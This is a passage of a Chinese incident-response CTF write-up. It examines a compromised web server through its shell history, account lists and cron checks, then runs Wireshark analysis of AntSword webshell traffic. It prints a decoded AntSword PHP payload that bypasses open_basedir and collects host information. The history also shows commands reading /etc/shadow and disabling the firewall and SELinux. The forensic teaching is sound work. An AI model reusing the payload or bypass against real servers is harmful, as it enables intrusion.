 249 3月   7 12:01 wwwlogs</span><br><span class="line">drwxr-xr-x  4 root root  38 3月   7 12:01 wwwroot</span><br><span class="line"></span><br><span class="line">[root@web-server /]<span class="comment"># ll /www/server/</span></span><br><span class="line">总用量 12</span><br><span class="line">drwxr-xr-x  2 root  root     6 3月   7 11:40 bt_tomcat_web</span><br><span class="line">drwxr-x---  6 mysql mysql 4096 7月  16 16:35 data</span><br><span class="line">drwxr-xr-x  3 root  root    19 3月   7 11:40 go_project</span><br><span class="line">-rw-r--r--  1 root  root    64 3月   7 11:45 lib.pl</span><br><span class="line">drwxr-xr-x 10 root  root   222 3月   7 12:01 mysql</span><br><span class="line">drwxr-xr-x 13 root  root   231 3月   7 12:01 nginx</span><br><span class="line">drwxr-xr-x  3 root  root    19 3月   7 11:40 nodejs</span><br><span class="line">drwxr-xr-x  3 root  root    21 3月   7 11:40 other_project</span><br><span class="line">drw------- 16 root  root  4096 3月   7 14:39 panel</span><br><span class="line">drwxr-xr-x  3 root  root    16 3月   7 11:52 php</span><br><span class="line">drwxr-xr-x  3 root  root    59 3月   7 11:53 phpmyadmin</span><br><span class="line">drwxr-xr-x  2 root  root     6 3月   7 11:40 proxy_project</span><br><span class="line">drwxr-xr-x  6 root  root    71 3月   7 11:51 pure-ftpd</span><br><span class="line">drwxr-xr-x  2 root  root     6 3月   7 11:41 pyporject_evn</span><br><span class="line">drwxr-xr-x  3 root  root    19 3月   7 11:41 python_project</span><br><span class="line">drwxr-xr-x  2 root  root    24 3月   7 11:40 stop</span><br></pre></td></tr></table></figure>
+
+<p>存在宝塔集成环境</p>
+<h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server /]<span class="comment"># history </span></span><br><span class="line">    systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line">    systemctl <span class="built_in">disable</span> --now firewalld</span><br><span class="line">    setenforce 0</span><br><span class="line">    vim</span><br><span class="line">    vi /etc/sysconfig/selinux </span><br><span class="line">    poweroff</span><br><span class="line">    ip a</span><br><span class="line">    <span class="built_in">cd</span> /var/</span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    <span class="built_in">cd</span> ww</span><br><span class="line">    <span class="built_in">cd</span> /home/</span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    mysql</span><br><span class="line">    yum install -y wget &amp;&amp; wget -O install.sh https://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh ed8484bec</span><br><span class="line">    BT</span><br><span class="line">    bt</span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    <span class="built_in">cd</span> /www/</span><br><span class="line">    <span class="built_in">cd</span> wwwroot/</span><br><span class="line">    <span class="built_in">cd</span> 127.0.0.1/</span><br><span class="line">    <span class="built_in">cd</span> wwwlogs/</span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    <span class="built_in">cat</span> 127.0.0.1.<span class="built_in">log</span> </span><br><span class="line">    <span class="built_in">cd</span> nodejs/</span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    <span class="built_in">cd</span> ..</span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    <span class="built_in">cd</span> tcp-error.log </span><br><span class="line">    <span class="built_in">cat</span> tcp-error.log </span><br><span class="line">    <span class="built_in">cat</span> nginx_error.log </span><br><span class="line">    <span class="built_in">cat</span> access.log </span><br><span class="line">    <span class="built_in">cat</span> 127.0.0.1.<span class="built_in">log</span> </span><br><span class="line">    <span class="built_in">cd</span> /www/</span><br><span class="line">    <span class="built_in">cd</span> wwwlogs/</span><br><span class="line">    <span class="built_in">cat</span> 127.0.0.1.<span class="built_in">log</span> </span><br><span class="line">    bt</span><br><span class="line">    <span class="built_in">cd</span> /www/wwwroot/</span><br><span class="line">    <span class="built_in">cd</span> 127.0.0.1/</span><br><span class="line">    <span class="built_in">rm</span> -rf flag1 1</span><br><span class="line">    <span class="built_in">rm</span> -rf version2.php </span><br><span class="line">    <span class="built_in">ls</span></span><br><span class="line">    hardlink </span><br><span class="line">    hwclock </span><br><span class="line">    docker ps</span><br><span class="line">    <span class="built_in">rm</span> -rf pe9.sql </span><br><span class="line">    <span class="built_in">cd</span> vendor/</span><br><span class="line">    <span class="built_in">cd</span> 127.0.0.1/</span><br><span class="line">    .api</span><br><span class="line">    <span class="built_in">mkdir</span> .api</span><br><span class="line">    <span class="built_in">cd</span> .api/</span><br><span class="line">    <span class="built_in">cd</span> api/</span><br><span class="line">    <span class="built_in">cp</span> * ../.api/</span><br><span class="line">    <span class="built_in">cd</span> .api/</span><br><span class="line">    vim mpnotify.php </span><br><span class="line">    vim  alinotify.php </span><br><span class="line">    <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">    <span class="built_in">who</span></span><br><span class="line">    w</span><br><span class="line">    <span class="built_in">history</span></span><br><span class="line">    useradd flag3&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;</span><br><span class="line">    <span class="built_in">env</span></span><br><span class="line">    <span class="variable">$flag3</span> = [root@web-server .api]<span class="comment"># useradd flag3&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;</span></span><br><span class="line">    useradd: invalid user name <span class="string">&#x27;flag3&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;&#x27;</span></span><br><span class="line">    <span class="variable">$flag3</span> = flag&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;</span><br><span class="line">    vim /etc/profile</span><br><span class="line">    <span class="built_in">source</span> /etc/p</span><br><span class="line">    <span class="built_in">source</span> /etc/profile</span><br><span class="line">    <span class="built_in">env</span></span><br></pre></td></tr></table></figure>
+
+<p>通过上面的敏感一些文件和命令可以发现一些<code>flag</code>哈哈哈.比如查看一下<code>.api</code>目录</p>
+<mark class="tag-plugin colorful mark" color="red">题目的本意是提醒你别忘了看环境变量哦~~~</mark>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server ~]<span class="comment"># find / -name .api</span></span><br><span class="line">/www/wwwroot/127.0.0.1/.api</span><br><span class="line">[root@web-server ~]<span class="comment"># cat /www/wwwroot/127.0.0.1/.api/* | grep flag</span></span><br><span class="line"><span class="variable">$flag2</span> = <span class="string">&quot;flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425446.png" data-fancybox="true"/></div></div>
+
+<h3 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a>查看账号</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server /]<span class="comment"># cat /etc/passwd |grep -v &quot;nologin&quot;</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"><span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析开机自启程序"><a href="#分析开机自启程序" class="headerlink" title="分析开机自启程序"></a>分析开机自启程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/rc.d/rc*</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看计划或定时任务"><a href="#查看计划或定时任务" class="headerlink" title="查看计划或定时任务"></a>查看计划或定时任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab </span><br><span class="line"><span class="built_in">cat</span> /etc/cron.d/*</span><br><span class="line"><span class="built_in">cat</span> /var/spool/cron/root</span><br></pre></td></tr></table></figure>
+
+<h2 id="全流量包分析"><a href="#全流量包分析" class="headerlink" title="全流量包分析"></a>全流量包分析</h2><p>下载<code>数据包1.pcapng</code>,使用<code>Wireshark</code>分析.在过滤器中输入<code>http</code>随便选中一个流量右键—&gt;追踪流—&gt;<code>TCP流</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425103.png" data-fancybox="true"/></div></div>
+
+<p>输入<code>0</code>回车从第一个包开始看</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425324.png" data-fancybox="true"/></div></div>
+
+<p>发现是个很典型的蚁剑流量哈,接下来对<code>POST</code>请求体<code>URL</code>解码慢慢分析</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161425890.png" data-fancybox="true"/></div></div>
+
+<p>我们去<code>index.php</code>代码中看看能不能找的这个参数值并给他删掉</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426499.png" data-fancybox="true"/></div></div>
+
+<p>发现啥也没有…</p>
+<blockquote>
+<p>在大型框架或内容管理系统（CMS）中，URL请求的处理方式与简单的文件名加参数不同。这些系统通常使用路由机制来管理URL请求，路由机制允许开发者将特定的URL模式映射到后端的处理函数或控制器上。这意味着，当你访问一个URL时，系统会根据预先定义的路由规则来决定执行哪个功能，而不是直接去查找对应的文件。路由可以由CMS本身的功能提供，也可以由外部框架的功能或注解等方式提供。因此，为了理解或修改URL请求的处理方式，我们需要查看CMS或框架中定义路由的地方，这些地方可能是配置文件、插件设置或特定的注解代码。通过这种方式，系统能够更灵活地响应不同的URL请求，并提供更复杂的逻辑处理。</p>
+<p>路由的来源</p>
+<ol>
+<li><strong>CMS功能提供的路由</strong>：许多CMS，例如WordPress、Joomla等，内置了路由功能，可以通过插件或主题配置自定义路由。</li>
+<li><strong>框架提供的路由</strong>：诸如Laravel、Symfony等PHP框架，通常包含强大的路由系统，允许开发者定义复杂的路由规则。</li>
+<li><strong>注解提供的路由</strong>：一些框架支持通过注解的方式定义路由，这样路由规则可以直接写在控制器的注释中。</li>
+</ol>
+</blockquote>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426649.png" data-fancybox="true"/></div></div>
+
+<p>可以发现一句话木马,然后去逐步分析请求体特征</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426779.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>); <span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>); <span class="comment">// 设置脚本执行时间无限制</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$opdir</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>); <span class="comment">// 获取 open_basedir 配置</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="variable">$ocwd</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]); <span class="comment">// 获取当前脚本的目录</span></span><br><span class="line">    <span class="variable">$oparr</span> = <span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>), <span class="variable">$opdir</span>); <span class="comment">// 解析 open_basedir 目录，以 ; 或 : 为分隔符</span></span><br><span class="line">    @<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>, <span class="variable">$ocwd</span>, <span class="title function_ invoke__">sys_get_temp_dir</span>()); <span class="comment">// 将当前目录和临时目录添加到数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 如果目录不可写，跳过循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="variable">$item</span> . <span class="string">&quot;/.fd491f470fb7&quot;</span>; <span class="comment">// 创建一个临时目录路径</span></span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>); <span class="comment">// 尝试创建临时目录</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 如果临时目录不存在，跳过循环</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>); <span class="comment">// 获取临时目录的绝对路径</span></span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>); <span class="comment">// 切换到临时目录</span></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>); <span class="comment">// 将 open_basedir 设置为上一级目录</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分割目录路径，并遍历每个目录</span></span><br><span class="line">        <span class="variable">$cntarr</span> = @<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>, <span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>); <span class="comment">// 逐级返回上一级目录</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/&quot;</span>); <span class="comment">// 将 open_basedir 设置为根目录</span></span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>); <span class="comment">// 删除临时目录</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数用于编码输出</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数用于输出内容</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取输出缓冲区内容</span></span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// 清空并关闭输出缓冲区</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;4a0c&quot;</span> . <span class="string">&quot;dc70&quot;</span>; <span class="comment">// 输出固定的标识符</span></span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>); <span class="comment">// 输出编码后的内容</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;db6&quot;</span> . <span class="string">&quot;da5&quot;</span>; <span class="comment">// 输出固定的标识符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(); <span class="comment">// 开启输出缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]); <span class="comment">// 获取当前脚本的目录</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$D</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]); <span class="comment">// 获取翻译后的路径（兼容性处理）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$R</span> = <span class="string">&quot;<span class="subst">&#123;$D&#125;</span>\t&quot;</span>; <span class="comment">// 初始化结果字符串</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$D</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">range</span>(<span class="string">&quot;C&quot;</span>, <span class="string">&quot;Z&quot;</span>) <span class="keyword">as</span> <span class="variable">$L</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable">$R</span> .= <span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>; <span class="comment">// 添加Windows盘符</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$R</span> .= <span class="string">&quot;/&quot;</span>; <span class="comment">// 添加根目录</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$R</span> .= <span class="string">&quot;\t&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前用户信息</span></span><br><span class="line">    <span class="variable">$u</span> = (<span class="title function_ invoke__">function_exists</span>(<span class="string">&quot;posix_getegid&quot;</span>)) ? @<span class="title function_ invoke__">posix_getpwuid</span>(@<span class="title function_ invoke__">posix_geteuid</span>()) : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$s</span> = (<span class="variable">$u</span>) ? <span class="variable">$u</span>[<span class="string">&quot;name&quot;</span>] : @<span class="title function_ invoke__">get_current_user</span>(); <span class="comment">// 获取当前用户名或POSIX用户名</span></span><br><span class="line">    <span class="variable">$R</span> .= <span class="title function_ invoke__">php_uname</span>(); <span class="comment">// 获取系统信息</span></span><br><span class="line">    <span class="variable">$R</span> .= <span class="string">&quot;\t<span class="subst">&#123;$s&#125;</span>&quot;</span>; <span class="comment">// 添加用户名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$R</span>; <span class="comment">// 输出结果</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>(); <span class="comment">// 处理异常并输出错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">asoutput</span>(); <span class="comment">// 调用输出函数</span></span><br><span class="line"><span class="keyword">die</span>(); <span class="comment">// 结束脚本执行</span></span><br></pre></td></tr></table></figure>
+
+<p>上面这个可能比较复杂,我们接着往下看,可以看到流11</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);<span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);<span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;<span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>),<span class="variable">$opdir</span>);@<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());<span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;<span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>))&#123;<span class="keyword">continue</span>;&#125;;<span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.b1e668&quot;</span>;@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);<span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>))&#123;<span class="keyword">continue</span>;&#125;<span class="variable">$tmdir</span>=<span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>);@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);<span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++)&#123;@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);&#125;;@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);<span class="keyword">break</span>;&#125;;&#125;;;<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$out</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();<span class="title function_ invoke__">ob_end_clean</span>();<span class="keyword">echo</span> <span class="string">&quot;b6&quot;</span>.<span class="string">&quot;887&quot;</span>;<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);<span class="keyword">echo</span> 